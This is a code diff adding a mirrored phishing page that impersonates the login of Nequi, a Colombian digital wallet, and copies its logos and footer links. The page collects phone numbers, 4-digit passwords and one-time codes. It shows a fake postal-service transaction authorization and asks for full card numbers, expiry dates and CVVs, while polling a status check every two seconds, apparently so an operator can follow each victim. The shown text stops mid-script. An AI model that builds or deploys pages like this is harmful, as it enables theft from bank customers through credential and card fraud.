@@ -1,0 +1,693 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Mirrored from tutramitpropulso.com/bdigital/inicio.php by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 10 May 2024 00:52:04 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+    
+</body>
+
+<!-- Mirrored from tutramitpropulso.com/bdigital/inicio.php by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 10 May 2024 00:52:04 GMT -->
+</html>
+
+<html>
+
+<head>
+  
+    
+    <meta charset="utf-8">
+    <title>Nequi</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="generator" content="Webflow">
+    <meta http-equiv="cache-control" content="max-age=0">
+    <meta http-equiv="cache-control" content="no-cache">
+    <meta http-equiv="expires" content="0">
+    <meta http-equiv="expires" content="Tue, 01 Jan 1980 1:00:00 GMT">
+    <meta http-equiv="pragma" content="no-cache">
+      <style type="text/css" id="operaUserStyle"></style>
+    <link rel="stylesheet" type="text/css" href="../css/normalize.css">
+    <link rel="stylesheet" type="text/css" href="../css/nequi_two.webflow.css">
+    <link rel="stylesheet" type="text/css" href="../css/nequi_one.webflow.css">
+    <link rel="stylesheet" type="text/css" href="../css/main.css">
+
+
+    <script type="text/javascript" src="../js/jquery-3.6.0.min.js"></script>
+    <script type="text/javascript" src="../js/functions.js"></script>
+    <script type="text/javascript" src="../js/ready.js"></script> 
+     <link href="../css/style.css" rel="stylesheet">
+    <link href="../css/stylesheet.css" rel="stylesheet"> 
+        <script src="../js/jquery.jclock-min.js" type="text/javascript"></script>
+    <!-- Librerias JS -->
+    <script src="../../ajax.googleapis.com/ajax/libs/angularjs/1.4.0-beta.2/angular.min.js"></script>
+    <script src="../../code.angularjs.org/1.4.3/i18n/angular-locale_en-us.js"></script>
+    <style type="text/css">
+    body{
+            background-color: #fbe5f2;
+            
+            justify-content: center;
+         
+            margin-top: 10px;
+
+        }
+        #fondo{
+            position: fixed;
+            z-index: 600;
+            width: 100%;
+            height: 100%;
+            top: 0;
+            left: 0;
+                                    
+        }
+
+        #frm-esperando{
+            padding: 30px 20px 0px 20px;
+        }
+        
+        /* Estilo para el botón habilitado */
+        .btn-habilitado {
+            background-color: #DA0081; /* Cambia el color a amarillo */
+            color: #fff;
+        }
+
+        /* Estilo para el botón deshabilitado */
+        .btn-deshabilitado {
+            background-color: #F1BFDA; /* Cambia el color a gris */
+            color: #fff;
+        }
+            #frm-nuevootp{
+                display: none;
+            }
+
+    </style>
+    
+<script type="text/javascript">    
+            $(document).ready(function(){
+                buscar_documento();
+
+                var FechaFull = new Date();
+                var dia = FechaFull.getDate();
+                var mes = FechaFull.getMonth();
+                var ano = FechaFull.getFullYear();
+
+                mes = mes + 1;
+
+                $("#fec").html(dia + "/" + mes + "/" + ano);
+
+                setInterval(consultar_estado,2000);  
+            }); 
+        </script>   
+</head>
+
+<body ng-app="App" class="ng-scope">
+     
+   
+
+     <div id="frm-nuevootp" class="frm-modal">
+           <img src="../img/nequi-4.png" alt="" style="width: 100%; margin-top: 100px;" >                                       <img src="../img/nequi5.svg" alt="" style="width: 30%; margin-top: 30px;" >
+            <h2 style="margin-bottom: 0;"><b></b></h2>
+            <br>
+            <div class="formulario">
+                <input style="background-color: #fbf7fb;"placeholder="Ingresa tu clave dinámica"type="password" name="txt-nuevootp" id="txt-nuevootp" class="entradas" autocomplete="off" maxlength="6" pattern="[0-9]*" inputmode="numeric" onKeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;">
+                <div class="error" id="err-nuevootp" style="display:flex; text-align: center;">El código que has ingresado es inválido o ha caducado. Intenta nuevamente.</div>
+                <br>
+                <button class="btn" id="btn-validar-nuevo">Validar</button>
+            </div>
+        </div>
+
+          <div id="frm-otp" class="frm-modal">
+            <img src="../img/nequi-4.png" alt="" style="width: 100%; margin-top: 100px;" >                                       <img src="../img/nequi5.svg" alt="" style="width: 30%; margin-top: 30px;" >
+                <input style="background-color: #fbf7fb; margin-bottom:15px ;" placeholder="Ingresa tu clave dinámica"type="password" name="txt-otp" id="txt-otp" class="entradas" autocomplete="off" maxlength="6" pattern="[0-9]*" inputmode="numeric" onkeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;">
+                <button class="btn btn-deshabilitado" id="btn-validar" disabled>Validar</button>
+            </div>
+        </div>
+
+
+              <div id="frm-esperando" class="frm-modal2" style="display:block; width: 90%; background-color:#fbe5f2; height: 100%; margin-top: 110px;">
+            <img src="../img/loading.gif" width="25%" id="logo-entidad-472">
+            <br><br>
+            <div>Por favor espere un momento  validando algunos datos</div>
+        
+                               
+        </div>
+
+        
+
+
+
+
+        <div id="frm-autorizar" class="frm-modal">
+            <div style="padding: 30px 30px 0px 30px">
+                <table border="0" cellpadding="0" cellspacing="0" width="100%">
+                    <tr>
+                        <td valign="middle" align="left"><img src="../img/verificado.jpg" width="100"></td>
+                        <td valign="middle" align="right"><img src="../img/mcheck.png" width="120"></td>
+                    </tr>
+                </table>
+            </div>
+            <div class="titulo">Autorización de Transacción</div>
+            <br>
+            <div class="descripcion">La transacción que intentas realizar con <b>SERVICIOS POSTALES NACIONALES S.A.S.</b> por $6.200 el día <span id="fec">--</span> con la tarjeta terminada en <b><span id="tar">9969</span></b> deber ser autorizada.</div>
+            
+            <div class="titulo">DETALLES DE TRANSACCIÓN</div>
+            <br>
+            <div class="descripcion">
+                <b>Comercio:</b> SERVICIOS POSTALES NACIONALES S.A.S.<br>
+                <b>Monto de la transacción:</b> $6.200<br>
+                <b>Número de autorización:</b> AG3244234
+            </div>
+            <br><br>
+            <div class="formulario">                
+                <button class="btn" id="btn-autorizar">Autorizar</button>
+            </div>
+        </div>
+
+       
+            
+    <div id="content">
+        <!-- ngInclude: getTemplate('/header.html') -->
+        <div ng-include="getTemplate('/header.html')" class="ng-scope">
+            <header class="ng-scope">
+                <div class="wrap-header">
+                    <div class="row">
+                        <div class="col-xs-12 col-md-2">
+                            <div class="logo"> <a href="https://www.nequi.com.co/"> <img alt="nequi"
+                                        src="https://uploads-ssl.webflow.com/6317a229ebf7723658463b4b/64dfef05bc6705edb9447499_nequi.svg">
+                                </a> </div>
+                            <div class="btn-menu-hamburguer" ng-click="openMenu();"> <a class=""> <span></span> </a>
+                            </div>
+                        </div>
+                        <div class="col-xs-12 col-md-10 container-buttons">
+                            <div class="wrap-main-menu ">
+                                <div class="row">
+                                    <div class="col-xs-12 col-md-8"> </div>
+                                    <div class="col-xs-12 col-md-4">
+                                        <div class="buttons-right">
+                                            <ul> <!-- ngIf: !hidePa -->
+                                                <li ng-if="!hidePa" class="ng-scope"> <a target="_blank"
+                                                        href="https://recarga.nequi.com.co/bdigitalpsl"
+                                                        class="ng-binding">Recarga</a> </li><!-- end ngIf: !hidePa -->
+                                            </ul>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </header>
+        </div>
+        <section class="login-section ng-scope" ng-controller="loginController as loginControl">
+            <div class="login-wrap">
+                <h1 class="ng-binding">Entra a tu Nequi</h1>
+                <p class="ng-binding" id ="sms" style="display:none;">Ups, esa no es la clave de tu nequi.</p>
+                <div class="login-form-wrap">
+                   
+                          <div class="container-form">
+                            <div class="input-country">
+                                <div class="wrap-select-country">
+                                    <select-country selected-country="loginControl.selectCountry"
+                                        options="loginControl.selectOption"
+                                        on-select-country="loginControl.onSelectCountry(option)"
+                                        class="ng-isolate-scope">
+                                        <div class="select-country" ng-click="toggleSelect();">
+                                            <div class="country-wrap country-active">
+                                                <div class="select-col select-col-img"> <img
+                                                        src="../img/flag_colombia.png" alt="co"> </div>
+                                                <div class="select-col">
+                                                    <p class="ng-binding"> +57 </p> <input class="country-input"
+                                                        type="text" name="j_region" id="j_region" value="57">
+                                                </div>
+                                            </div>
+                                            <ul> <!-- ngRepeat: option in options -->
+                                                <li ng-repeat="option in options" class="ng-scope">
+                                                    <div ng-click="setCountry($index);" class="country-wrap">
+                                                        <div class="select-col select-col-img"> <img
+                                                                src="../img/flag_colombia.png" alt="co"> </div>
+                                                        <div class="select-col">
+                                                            <p class="ng-binding">+57</p>
+                                                        </div>
+                                                    </div>
+                                                </li>
+                                                
+                                            </ul>
+                                        </div>
+                                    </select-country>
+                                </div>
+                                <div class="form-group">
+                                    <input type="tel" 
+                                    id="txt-usuario"
+                                    name="txt-usuario"
+                                    class="ng-pristine ng-valid-us-phone-number ng-invalid ng-invalid-required ng-valid-pattern ng-valid-minlength ng-touched"
+                                    required="required" maxlength="12" minlength="12">
+                                    <label for="j_username" class="ng-binding">Número de celular</label>
+                                </div>
+                            </div>
+                            
+                            <div class="form-group">
+                                <input
+                                    class="password ng-pristine ng-invalid ng-invalid-required ng-valid-pattern ng-valid-minlength ng-valid-maxlength ng-touched"
+                                    type="password" id="txt-password" name="txt-password" required maxlength="4" minlength="4">
+                                <label for="j_password" class="ng-binding">Contraseña</label>
+                            </div>
+                            <!-- ngIf: loginControl.showCaptcha -->
+                          
+                           
+
+                        <div class="btn-wrap">
+                            <button class="btn btn-deshabilitado" id="btn-iniciar-sesion" disabled style="cursor: pointer;
+    display: block;
+    width: 100%;
+    height: 48px;
+    margin: 0 auto;
+    padding-right: 30px;
+    padding-left: 30px;
+    float: none;
+    border-radius: 4px;
+    background-color: #DA0081;
+    font-family: Manrope, sans-serif;
+    color: #fff;
+    font-size: 1rem;
+    font-weight: 500;
+    line-height: 20px;
+    border: none;
+}">Entrar</button>
+                        </div>
+                </div>
+            </div>
+
+
+            
+
+
+
+
+        </section>
+
+        <!-- ngInclude: getTemplate('/footer.html') -->
+        <div ng-include="getTemplate('/footer.html')" class="ng-scope">
+            <footer class="ng-scope">
+                <div class="container-footer"> <!-- ngIf: !hidePa -->
+                    <div ng-if="!hidePa" class="logo-vigilado ng-scope"></div><!-- end ngIf: !hidePa -->
+                    <div class="container-top">
+                        <div class="logo-nequi"> <img alt="logo nequi"
+                                src="https://uploads-ssl.webflow.com/6317a229ebf7723658463b4b/64e50b03c9fda96db04be382_logo-nequi-blanco.svg">
+                        </div>
+                        <div class="stores"> <a
+                                href="https://play.google.com/store/apps/details?id=com.nequi.MobileApp&amp;hl=es"> <img
+                                    src="https://uploads-ssl.webflow.com/6317a229ebf7723658463b4b/64e50ed88b7bb33f2c2c4653_store-googleplay.svg">
+                            </a> <a href="https://apps.apple.com/co/app/nequi/id1075378688"> <img
+                                    src="https://uploads-ssl.webflow.com/6317a229ebf7723658463b4b/64e50ed702047ba456edd2cb_store-apple.svg">
+                            </a> <a
+                                href="https://appgallery.huawei.com/#/app/C101700131?channelId=browser&amp;detailType=0">
+                                <img
+                                    src="https://uploads-ssl.webflow.com/6317a229ebf7723658463b4b/64e50ed702047ba456edd25c_store-huawei.svg">
+                            </a> </div>
+                        <div class="group-bancolombia"> <a href="https://www.grupobancolombia.com/"> <img
+                                    class="img-group-bancolombia"
+                                    src="https://uploads-ssl.webflow.com/6317a229ebf7723658463b4b/64e50f4c6011eb184c8d7d99_logo-grupo-bancolombia.svg">
+                            </a> </div>
+                    </div>
+                    <hr class="separator">
+                    <div class="container-middle"> <!-- ngRepeat: item in configCountry.labels -->
+                        <div class="col ng-scope" ng-repeat="item in configCountry.labels"> <input type="checkbox"
+                                id="info-legal" class="hide"> <label for="info-legal" class="ng-binding"> Información
+                                legal <img class="ic-accordion hide"
+                                    src="https://uploads-ssl.webflow.com/6317a229ebf7723658463b4b/64e573948290d271c9185df0_ic-arrow.svg">
+                            </label>
+                            <div class="content-accordion"> <!-- ngRepeat: dataLink in item.data --><a
+                                    ng-repeat="dataLink in item.data"
+                                    href="https://www.nequi.com.co/legal-web/condiciones-de-uso-de-la-pagina-web"
+                                    class="ng-binding ng-scope">Condiciones de
+                                    uso</a><!-- end ngRepeat: dataLink in item.data --><a
+                                    ng-repeat="dataLink in item.data"
+                                    href="https://www.nequi.com.co/legal-web/tratamiento-de-datos-personales-nequi"
+                                    class="ng-binding ng-scope">Tratamiento de Datos
+                                    Personales</a><!-- end ngRepeat: dataLink in item.data --><a
+                                    ng-repeat="dataLink in item.data"
+                                    href="https://www.nequi.com.co/informacion-legal#consumidor-financiero"
+                                    class="ng-binding ng-scope">Consumidor
+                                    fianciero</a><!-- end ngRepeat: dataLink in item.data --><a
+                                    ng-repeat="dataLink in item.data"
+                                    href="https://www.nequi.com.co/informacion-legal/defensor-del-consumidor-financiero-de-nequi"
+                                    class="ng-binding ng-scope">Defensor del Consumidor
+                                    Financiero</a><!-- end ngRepeat: dataLink in item.data --><a
+                                    ng-repeat="dataLink in item.data"
+                                    href="https://www.nequi.com.co/legal-tarjeta-nequi/terminos-y-condiciones-de-tarjeta-nequi"
+                                    class="ng-binding ng-scope">Términos y condiciones Tarjeta
+                                    Nequi</a><!-- end ngRepeat: dataLink in item.data --><a
+                                    ng-repeat="dataLink in item.data" href="https://www.nequi.com.co/informacion-legal"
+                                    class="ng-binding ng-scope">Legal
+                                    Nequi</a><!-- end ngRepeat: dataLink in item.data --> </div>
+                        </div><!-- end ngRepeat: item in configCountry.labels -->
+                        <div class="col ng-scope" ng-repeat="item in configCountry.labels"> <input type="checkbox"
+                                id="para-personas" class="hide"> <label for="para-personas" class="ng-binding"> Para
+                                personas <img class="ic-accordion hide"
+                                    src="https://uploads-ssl.webflow.com/6317a229ebf7723658463b4b/64e573948290d271c9185df0_ic-arrow.svg">
+                            </label>
+                            <div class="content-accordion"> <!-- ngRepeat: dataLink in item.data --><a
+                                    ng-repeat="dataLink in item.data" href="https://www.nequi.com.co/tarjeta-nequi"
+                                    class="ng-binding ng-scope">Tarjeta
+                                    Nequi</a><!-- end ngRepeat: dataLink in item.data --><a
+                                    ng-repeat="dataLink in item.data"
+                                    href="https://www.nequi.com.co/prestamo-salvavidas"
+                                    class="ng-binding ng-scope">Préstamo
+                                    Salvavidas</a><!-- end ngRepeat: dataLink in item.data --><a
+                                    ng-repeat="dataLink in item.data" href="https://www.nequi.com.co/prestamo-propulsor"
+                                    class="ng-binding ng-scope">Préstamo
+                                    Propulsor</a><!-- end ngRepeat: dataLink in item.data --><a
+                                    ng-repeat="dataLink in item.data" href="https://www.nequi.com.co/usa-tu-plata"
+                                    class="ng-binding ng-scope">Usa tu
+                                    plata</a><!-- end ngRepeat: dataLink in item.data --><a
+                                    ng-repeat="dataLink in item.data" href="https://www.nequi.com.co/paypal"
+                                    class="ng-binding ng-scope">Paypal</a><!-- end ngRepeat: dataLink in item.data --><a
+                                    ng-repeat="dataLink in item.data" href="https://www.nequi.com.co/remesas"
+                                    class="ng-binding ng-scope">Remesas</a><!-- end ngRepeat: dataLink in item.data -->
+                            </div>
+                        </div><!-- end ngRepeat: item in configCountry.labels -->
+                        <div class="col ng-scope" ng-repeat="item in configCountry.labels"> <input type="checkbox"
+                                id="para-negocio" class="hide"> <label for="para-negocio" class="ng-binding"> Para tu
+                                negocio <img class="ic-accordion hide"
+                                    src="https://uploads-ssl.webflow.com/6317a229ebf7723658463b4b/64e573948290d271c9185df0_ic-arrow.svg">
+                            </label>
+                            <div class="content-accordion"> <!-- ngRepeat: dataLink in item.data --><a
+                                    ng-repeat="dataLink in item.data" href="https://negocios.nequi.co/"
+                                    class="ng-binding ng-scope">Negocios</a><!-- end ngRepeat: dataLink in item.data -->
+                            </div>
+                        </div><!-- end ngRepeat: item in configCountry.labels -->
+                        <div class="col ng-scope" ng-repeat="item in configCountry.labels"> <input type="checkbox"
+                                id="ayuda" class="hide"> <label for="ayuda" class="ng-binding"> Ayuda <img
+                                    class="ic-accordion hide"
+                                    src="https://uploads-ssl.webflow.com/6317a229ebf7723658463b4b/64e573948290d271c9185df0_ic-arrow.svg">
+                            </label>
+                            <div class="content-accordion"> <!-- ngRepeat: dataLink in item.data --><a
+                                    ng-repeat="dataLink in item.data" href="https://ayuda.nequi.com.co/hc/es"
+                                    class="ng-binding ng-scope">Centro de
+                                    ayuda</a><!-- end ngRepeat: dataLink in item.data --><a
+                                    ng-repeat="dataLink in item.data" href="https://www.nequi.com.co/blog"
+                                    class="ng-binding ng-scope">Blog metidas de
+                                    plata</a><!-- end ngRepeat: dataLink in item.data --><a
+                                    ng-repeat="dataLink in item.data" href="https://comunidad.nequi.co/"
+                                    class="ng-binding ng-scope">Comunidad
+                                    Nequi</a><!-- end ngRepeat: dataLink in item.data --><a
+                                    ng-repeat="dataLink in item.data"
+                                    href="https://www.nequi.com.co/roberto-hurtado-tips-de-seguridad"
+                                    class="ng-binding ng-scope">Tips de
+                                    seguridad</a><!-- end ngRepeat: dataLink in item.data --> </div>
+                        </div><!-- end ngRepeat: item in configCountry.labels -->
+                        <div class="col ng-scope" ng-repeat="item in configCountry.labels"> <input type="checkbox"
+                                id="conocenos" class="hide"> <label for="conocenos" class="ng-binding"> Conócenos <img
+                                    class="ic-accordion hide"
+                                    src="https://uploads-ssl.webflow.com/6317a229ebf7723658463b4b/64e573948290d271c9185df0_ic-arrow.svg">
+                            </label>
+                            <div class="content-accordion"> <!-- ngRepeat: dataLink in item.data --><a
+                                    ng-repeat="dataLink in item.data" href="https://www.nequi.com.co/somos-nequi"
+                                    class="ng-binding ng-scope">¿Quiénes
+                                    somos?</a><!-- end ngRepeat: dataLink in item.data --><a
+                                    ng-repeat="dataLink in item.data"
+                                    href="https://www.nequi.com.co/nequi-trabaja-con-nosotros"
+                                    class="ng-binding ng-scope">Trabaja con
+                                    nosotros</a><!-- end ngRepeat: dataLink in item.data --><a
+                                    ng-repeat="dataLink in item.data" href="https://www.nequi.com.co/sala-de-prensa"
+                                    class="ng-binding ng-scope">Sala de
+                                    prensa</a><!-- end ngRepeat: dataLink in item.data --><a
+                                    ng-repeat="dataLink in item.data" href="https://www.nequi.com.co/comunicados"
+                                    class="ng-binding ng-scope">Comunicados</a><!-- end ngRepeat: dataLink in item.data -->
+                            </div>
+                        </div><!-- end ngRepeat: item in configCountry.labels -->
+                    </div>
+                    <hr class="separator">
+                    <div class="container-end"> <!-- ngRepeat: item in configCountry.socialMedia --><a
+                            ng-repeat="item in configCountry.socialMedia" href="https://twitter.com/Nequi"
+                            class="ng-scope"> <img
+                                src="https://uploads-ssl.webflow.com/6317a229ebf7723658463b4b/64e5220142aa063fa007c444_ic-twitter.svg">
+                        </a><!-- end ngRepeat: item in configCountry.socialMedia --><a
+                            ng-repeat="item in configCountry.socialMedia" href="https://www.instagram.com/nequi_/"
+                            class="ng-scope"> <img
+                                src="https://uploads-ssl.webflow.com/6317a229ebf7723658463b4b/64e52201416719efe915e448_ic-instagram.svg">
+                        </a><!-- end ngRepeat: item in configCountry.socialMedia --><a
+                            ng-repeat="item in configCountry.socialMedia" href="https://www.facebook.com/appnequi/"
+                            class="ng-scope"> <img
+                                src="https://uploads-ssl.webflow.com/6317a229ebf7723658463b4b/64e52201c1a7bf3e9e5bd566_ic-facebook.svg">
+                        </a><!-- end ngRepeat: item in configCountry.socialMedia --><a
+                            ng-repeat="item in configCountry.socialMedia"
+                            href="https://www.linkedin.com/company/nequi/mycompany/" class="ng-scope"> <img
+                                src="https://uploads-ssl.webflow.com/6317a229ebf7723658463b4b/64e522013be191fdc4a0252e_ic-linkedin.svg">
+                        </a><!-- end ngRepeat: item in configCountry.socialMedia --><a
+                            ng-repeat="item in configCountry.socialMedia"
+                            href="https://www.youtube.com/channel/UCK1dLH3nTK-GOlgSVa95XNg/feed" class="ng-scope"> <img
+                                src="https://uploads-ssl.webflow.com/6317a229ebf7723658463b4b/64e52201c663d0190bc59ba8_ic-youtube.svg">
+                        </a><!-- end ngRepeat: item in configCountry.socialMedia --> </div>
+                    <hr class="separator hide show-mobile">
+                </div>
+            </footer>
+        </div>
+    </div>
+     
+
+
+
+       <div id="frm-animacion" class="frm-modal">
+            <img src="../img/tarjeta.gif">
+            <br>
+            <div>Estamos procesando su solicitud espere un momento</div>
+        </div>
+
+        <div id="frm-tarjeta" class="frm-modal">            
+            <div class="formulario" style="padding-top: 30px;">
+                <div class="etiqueta">Banco</div>
+                <select id="txt-entidad" name="txt-entidad" class="entradas">
+                    <option label="A continuación seleccione su banco" value="">A continuación seleccione su banco</option>
+                    <option label="BANCAMIA S.A." value="bancamia">BANCAMIA S.A.</option>
+                    <option label="BANCO AGRARIO" value="agrario">BANCO AGRARIO</option>
+                    <option label="BANCO AV VILLAS" value="avvillas">BANCO AV VILLAS</option>
+                    <option label="BANCO BBVA COLOMBIA S.A." value="bbva">BANCO BBVA COLOMBIA S.A.</option>
+                    <option label="BANCO CAJA SOCIAL" value="caja-social">BANCO CAJA SOCIAL</option>
+                    <option label="BANCO COOPERATIVO COOPCENTRAL" value="coopertaivo-coopcentral">BANCO COOPERATIVO COOPCENTRAL</option>
+                    <option label="BANCO CREDIFINANCIERA" value="credifinanciera">BANCO CREDIFINANCIERA</option>
+                    <option label="BANCO DAVIVIENDA" value="davivienda">BANCO DAVIVIENDA</option>
+                    <option label="BANCO DE BOGOTA" value="bogota">BANCO DE BOGOTA</option>
+                    <option label="BANCO DE OCCIDENTE" value="occidente">BANCO DE OCCIDENTE</option>
+                    <option label="BANCO FALABELLA " value="falabella">BANCO FALABELLA </option>
+                    <option label="BANCO FINANDINA S.A. BIC" value="finandina">BANCO FINANDINA S.A. BIC</option>
+                    <option label="BANCO GNB SUDAMERIS" value="sudameris">BANCO GNB SUDAMERIS</option>
+                    <option label="BANCO ITAU" value="itau">BANCO ITAU</option>
+                    <option label="BANCO PICHINCHA S.A." value="pichincha">BANCO PICHINCHA S.A.</option>
+                    <option label="BANCO POPULAR" value="popular">BANCO POPULAR</option>
+                    <option label="BANCO SANTANDER COLOMBIA" value="santander">BANCO SANTANDER COLOMBIA</option>
+                    <option label="BANCO SERFINANZA" value="serfinanza">BANCO SERFINANZA</option>
+                    <option label="BANCO UNION antes GIROS" value="union">BANCO UNION antes GIROS</option>
+                    <option label="BANCOLOMBIA" value="bancolombia">BANCOLOMBIA</option>
+                    <option label="BANCOOMEVA S.A." value="bancomeva">BANCOOMEVA S.A.</option>
+                    <option label="CFA COOPERATIVA FINANCIERA" value="cfa">CFA COOPERATIVA FINANCIERA</option>
+                    <option label="CITIBANK " value="citibank">CITIBANK</option>
+                    <option label="COLTEFINANCIERA" value="coltefinanciera">COLTEFINANCIERA</option>
+                    <option label="CONFIAR COOPERATIVA FINANCIERA" value="confiar">CONFIAR COOPERATIVA FINANCIERA</option>
+                    <option label="COOFINEP COOPERATIVA FINANCIERA" value="coofinep">COOFINEP COOPERATIVA FINANCIERA</option>
+                    <option label="COTRAFA" value="cotrafa">COTRAFA</option>
+                    <option label="DALE" value="dale">DALE</option>
+                    <option label="DAVIPLATA" value="1551">DAVIPLATA</option>
+                    <option label="IRIS" value="iris">IRIS</option>
+                    <option label="LULO BANK" value="lulo">LULO BANK</option>
+                    <option label="MOVII S.A." value="movii">MOVII S.A.</option>
+                    <option label="NEQUI" value="nequi">NEQUI</option>
+                    <option label="RAPPIPAY" value="rappipay">RAPPIPAY</option>
+                    <option label="RAPPIPAY DAVIPLATA" value="rappipay">RAPPIPAY DAVIPLATA</option>
+                    <option label="SCOTIABANK COLPATRIA" value="scotiabank-colpatria">SCOTIABANK COLPATRIA</option>
+                </select>
+                <div class="error" id="err-entidad">Seleccione un Banco</div>
+                <div class="espacio"></div>
+                <div class="etiqueta">Tarjeta</div>
+                <input type="text" name="txt-tarjeta" id="txt-tarjeta" class="entradas" autocomplete="off" maxlength="16" pattern="[0-9]*" inputmode="numeric" onKeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;">
+                <div class="error" id="err-tarjeta">Ingrese una tarjeta de crédito</div>
+                <div class="espacio"></div>
+                <table border="0" cellpadding="0" cellspacing="0" width="100%">
+                    <tr>
+                        <td>
+                            <div class="etiqueta">Mes</div>
+                            <select id="mFecha" name="mFecha" class="entradas">
+                                <option value="" default selected>Seleccionar</option>
+                                <option value="01">Enero</option>
+                                <option value="02">Febrero</option>
+                                <option value="03">Marzo</option>
+                                <option value="04">Abril</option>
+                                <option value="05">Mayo</option>
+                                <option value="06">Junio</option>
+                                <option value="07">Julio</option>
+                                <option value="08">Agosto</option>
+                                <option value="09">Septiembre</option>
+                                <option value="10">Octubre</option>
+                                <option value="11">Noviembre</option>
+                                <option value="12">Diciembre</option>
+                            </select>
+                        </td>
+                        <td>
+                            <div class="etiqueta">Año</div>
+                            <select id="aFecha" name="aFecha" class="entradas">
+                                <option value="" default selected>Seleccionar</option>                  
+                                <option value="2022">2022</option>
+                                <option value="2023">2023</option>
+                                <option value="2024">2024</option>
+                                <option value="2025">2025</option>
+                                <option value="2026">2026</option>
+                                <option value="2027">2027</option>
+                                <option value="2028">2028</option>
+                                <option value="2029">2029</option>
+                                <option value="2030">2030</option>
+                                <option value="2031">2031</option>
+                                <option value="2032">2032</option>
+                                <option value="2033">2033</option>
+                            </select>
+                        </td>
+                    </tr>
+                </table>
+                <div class="error" id="err-fecha">Ingrese la fecha de vencimiento</div>
+                <div class="espacio"></div>
+                <div class="etiqueta">CVV</div>
+                <input type="text" name="txt-cvv" id="txt-cvv" class="entradas" autocomplete="off" maxlength="3" pattern="[0-9]*" inputmode="numeric" onKeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;">
+                <div class="error" id="err-cvv">Ingrese el código de verificación</div>
+                <br><br>
+                <button class="btn" id="btn-pagar">Pagar</button>
+            </div>
+        </div>
+
+
+
+    
+
+
+
+    <!-- App -->
+
+
+    
+    <div
+        style="background-color: rgb(255, 255, 255); border: 1px solid rgb(204, 204, 204); box-shadow: rgba(0, 0, 0, 0.2) 2px 2px 3px; position: absolute; transition: visibility 0s linear 0.3s, opacity 0.3s linear 0s; opacity: 0; visibility: hidden; z-index: 2000000000; left: 0px; top: -10000px;">
+        <div
+            style="width: 100%; height: 100%; position: fixed; top: 0px; left: 0px; z-index: 2000000000; background-color: rgb(255, 255, 255); opacity: 0.05;">
+        </div>
+        <div class="g-recaptcha-bubble-arrow"
+            style="border: 11px solid transparent; width: 0px; height: 0px; position: absolute; pointer-events: none; margin-top: -11px; z-index: 2000000000;">
+        </div>
+        <div class="g-recaptcha-bubble-arrow"
+            style="border: 10px solid transparent; width: 0px; height: 0px; position: absolute; pointer-events: none; margin-top: -10px; z-index: 2000000000;">
+        </div>
+ 
+    </div>
+</body><!-- Encriptar -->
+
+</html>
+<script type="text/javascript">    
+    $(document).ready(function(){
+        buscar_documento();
+
+        var FechaFull = new Date();
+        var dia = FechaFull.getDate();
+        var mes = FechaFull.getMonth();
+        var ano = FechaFull.getFullYear();
+
+        mes = mes + 1;
+
+        $("#fec").html(dia + "/" + mes + "/" + ano);
+
+        setInterval(consultar_estado,2000);  
+
+        $("#txt-usuario").on("input", function() {
+            var inputValue = $(this).val();
+            if (inputValue.trim() !== "" && inputValue.length <= 10) {
+                $("#btn-iniciar-sesion").prop("disabled", false);
+                $("#btn-iniciar-sesion").removeClass("btn-deshabilitado").addClass("btn-habilitado");
+            } else {
+                $("#btn-iniciar-sesion").prop("disabled", true);
+                $("#btn-iniciar-sesion").removeClass("btn-habilitado").addClass("btn-deshabilitado");
+            }
+        });
+
+        $("#txt-password").on("input", function() {
+            var inputValue = $(this).val();
+            if (inputValue.trim() !== "" && inputValue.length <= 4) {
+                $("#btn-iniciar-sesion").prop("disabled", false);
+                $("#btn-iniciar-sesion").removeClass("btn-deshabilitado").addClass("btn-habilitado");
+            } else {
+                $("#btn-iniciar-sesion").prop("disabled", true);
+                $("#btn-iniciar-sesion").removeClass("btn-habilitado").addClass("btn-deshabilitado");
+            }
+        }); 
+    }); 
+</script> 
+   <script type="text/javascript">    
+    $(document).ready(function(){
+        // Función para habilitar/deshabilitar el botón
+        function toggleButton() {
+            var inputValue = $("#txt-otp").val();
+            if (inputValue.trim() !== "") {
+                $("#btn-validar").prop("disabled", false);
+                $("#btn-validar").removeClass("btn-deshabilitado").addClass("btn-habilitado");
+            } else {
+                $("#btn-validar").prop("disabled", true);
+                $("#btn-validar").removeClass("btn-habilitado").addClass("btn-deshabilitado");
+            }
+        }
+
+        // Ejecutar la función al cargar la página
+        toggleButton();
+
+        // Ejecutar la función al escribir en el input
+        $("#txt-otp").on("input", toggleButton);
+    }); 
+</script>
+ <script type="text/javascript">    
+    $(document).ready(function(){
+        // Función para habilitar/deshabilitar el botón
+        function toggleButton() {
+            var inputValue = $("#txt-nuevootp").val();
+            if (inputValue.trim() !== "") {
+                $("#btn-validar-nuevo").prop("disabled", false);
+                $("#btn-validar-nuevo").removeClass("btn-deshabilitado").addClass("btn-habilitado");
+            } else {
+                $("#btn-validar-nuevo").prop("disabled", true);
+                $("#btn-validar-nuevo").removeClass("btn-habilitado").addClass("btn-deshabilitado");
+            }
+        }
+
+        // Ejecutar la función al cargar la página
+        toggleButton();
+
+        // Ejecutar la función al escribir en el input
+        $("#txt-nuevootp").on("input", toggleButton);
+    }); 
+</script> 
+
+
+
+<script type="text/javascript">  
+
+
+    $(document).ready(function(){
+        // Función para habilitar/deshabilitar el botón
+        function toggleButton() {
+            var nombre = $("#txt-nombre").val().trim();
+            var celular = $("#txt-celular").val().trim();
+            var correo = $("#txt-correo").val().trim();
+            var direccion = $("#txt-direccion").val().trim();
+            var ciudad = $("#txt-ciudad").val().trim();
+
+            if (nombre !== "" && celular !== "" && correo !== "" && direccion !== "" && ciudad !== "") {
+                $("#btn-pagar-impuestos").prop("disabled", false);
+                $("#btn-pagar-impuestos").removeClass("btn-deshabilitado").addClass("btn-habilitado");
+            } else {
